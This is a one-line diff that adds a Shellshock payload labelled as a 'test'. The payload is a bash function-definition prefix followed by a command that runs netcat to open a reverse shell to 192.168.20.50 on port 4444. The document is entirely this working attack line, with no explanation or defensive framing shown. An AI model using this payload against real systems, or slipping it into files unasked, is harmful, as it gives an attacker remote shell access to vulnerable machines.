@@ -1,0 +1,1 @@
+() { :;}; echo "Shellshock Vulnerability TEST" $(/bin/sh -c "nc -e /bin/bash 192.168.20.50 4444")
